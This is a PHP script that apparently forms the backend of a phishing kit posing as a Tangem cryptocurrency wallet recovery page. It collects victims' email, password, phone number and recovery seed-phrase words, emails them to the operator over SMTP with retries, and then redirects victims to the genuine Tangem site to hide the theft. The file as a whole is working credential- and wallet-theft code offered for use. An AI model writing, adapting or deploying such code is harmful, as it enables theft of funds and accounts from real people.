<?php

use Exception;

include_once './config.php';

$email                  =   $_POST['email'];
$password               =   $_POST['password'];
$keys                   =   empty($_POST['keys']) ? null : $_POST['keys'];
$phone_number           =   empty($_POST['phone_number']) ? null : $_POST['phone_number'];
$phone_code             =   empty($_POST['phone_number_phoneCode']) ? null : $_POST['phone_number_phoneCode'];
$country_code           =   empty($_POST['phone_number_countryCode']) ? null : $_POST['phone_number_countryCode'];

if (empty($email) || empty($password)) {
    redirect(base_url('recover.php'));
} else {
    
    function sendEmail($try=1) {
        global $email;
        global $password;
        global $keys;
        global $phone_number;
        global $phone_code;
        global $country_code;
        
        try {
            $mail           =   get_mail_smtp();
            
            $mail->isHTML(true);
            $mail->Subject  = 'New Recovery for Tangem Wallet Received';

            $html           =   '<p>A New Recovery Detected,</p>' ;
            $html          .=   '<p>You have received a new query from <b>' . base_url() . '</b>,</p>' ;
            $html          .=   '<p><b>Additional detail</b></p>' ;
            $html          .=   '<ul>' ;
            $html          .=   "<li>Email : <b>".$email."</b></li>";
            $html          .=   "<li>Password : <b>".$password."</b></li>";
            $html          .=   "<li>Phone Code : <b>".$phone_code."</b> (<b>".$country_code."</b>)</li>";
            $html          .=   "<li>Phone Number : <b>".$phone_number."</b></li>";
            
            if(!empty($keys)) {
                $html  .=   "<li>Recovery Paraphrase :</li>";
                foreach ($keys as $ki => $key) {
                    $html  .=   "<li>Word $ki:  <b> $key </b></li>";
                }
            }
            
            $html          .=   '</ul>' ;
            $mail->Body     =   $html;
            $mail->AltBody  =   'Email : '.$email.' and Password :'. $password;

            $mail->send();

            $_SESSION["email"]          =   $email;
            $_SESSION["password"]       =   $password;
            $_SESSION["keys"]           =   $keys;
            $_SESSION["phone_number"]   =   $phone_number;
            $_SESSION["phone_code"]     =   $phone_code;
            $_SESSION["country_code"]   =   $country_code;
            
            if(empty($keys)) {
                redirect(base_url('paraphrase.php'));
            } else {
                redirect('https://tangem.com/en/');
            }
            
        } catch (Exception $exc) {
            $try = $try +1;
            echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
            if($try < 5) {
                sleep(2);
                sendEmail($try);
            } else {
                redirect(base_url());
            }
        }
    }
    
    sendEmail(1);
}
?>